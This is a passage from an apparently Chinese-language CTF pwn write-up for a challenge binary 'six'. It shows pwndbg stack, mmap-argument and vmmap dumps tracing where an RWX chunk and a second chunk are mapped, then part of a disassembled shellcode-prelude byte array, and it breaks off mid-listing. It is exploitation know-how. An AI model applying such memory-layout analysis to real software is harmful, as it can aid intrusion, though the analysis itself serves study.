class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xa563d35f2600</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0x703df49340fc</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0xdd44ac71043c3600</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0x703df4934000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块      </span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xa563d35f2000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块，地址不是/dev/urandom出来的地址，因为数值较大，mmap随机分配</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、第二次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xeccb72e069a9</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0xd1c2fd207617</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x4193ac317ff71a00</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xd1c2fd207000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第二块分配前</span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xeccb72e06000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff5000</span>     <span class="number">0x7ffff7ff6000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块</span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>我们看看，src处的数据到底是什么。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202020 src             db 48h ; H                 ; DATA XREF: main+71↑o</span><br><span class="line">.data:0000000000202020                                         ; main+87↑o ...</span><br><span class="line">.data:0000000000202021                 db  89h</span><br><span class="line">.data:0000000000202022                 db 0FCh</span><br><span class="line">.data:0000000000202023                 db  48h ; H</span><br><span class="line">.data:0000000000202024                 db  31h ; 1</span><br><span class="line">.data:0000000000202025                 db 0EDh</span><br><span class="line">.data:0000000000202026                 db  48h ; H</span><br><span class="line">.data:0000000000202027                 db  31h ; 1</span><br><span class="line">.data:0000000000202028                 db 0C0h</span><br><span class="line">.data:0000000000202029                 db  48h ; H</span><br><span class="line">.data:000000000020202A                 db  31h ; 1</span><br><span class="line">.data:000000000020202B                 db 0DBh</span><br><span class="line">.data:000000000020202C                 db  48h ; H</span><br><span class="line">.data:000000000020202D                 db  31h ; 1</span><br><span class="line">.data:000000000020202E                 db 0C9h</span><br><span class="line">.data:000000000020202F                 db  48h ; H</span><br><span class="line">.data:0000000000202030                 db  31h ; 1</span><br><span class="line">.data:0000000000202031                 db 0D2h</span><br><span class="line">.data:0000000000202032                 db  48h ; H</span><br><span class="line">.data:0000000000202033                 db  31h ; 1</span><br><span class="line">.data:0000000000202034                 db 0FFh</span><br><span class="line">.data:0000000000202035                 db  48h ; H</span><br><span class="line">.data:0000000000202036                 db  31h ; 1</span><br><span class="line">.data:0000000000202037                 db 0F6h</span><br><span class="line">.data:0000000000202038                 db  4Dh ; M</span><br><span class="line">.data:0000000000202039                 db  31h ; 1</span><br><span class="line">.data:000000000020203A                 db 0C0h</span><br><span class="line">.data:000000000020203B                 db  4Dh ; M</span><br><span class="line">.data:000000000020203C                 db  31h ; 1</span><br><span class="line">.data:000000000020203D                 db 0C9h</span><br><span class="line">.data:000000000020203E                 db  4Dh ; M</span><br><span class="line">.data:000000000020203F                 db  31h ; 1</span><br><span class="line">.data:0000000000202040                 db 0D2h</span><br><span class="line">.data:0000000000202041                 db  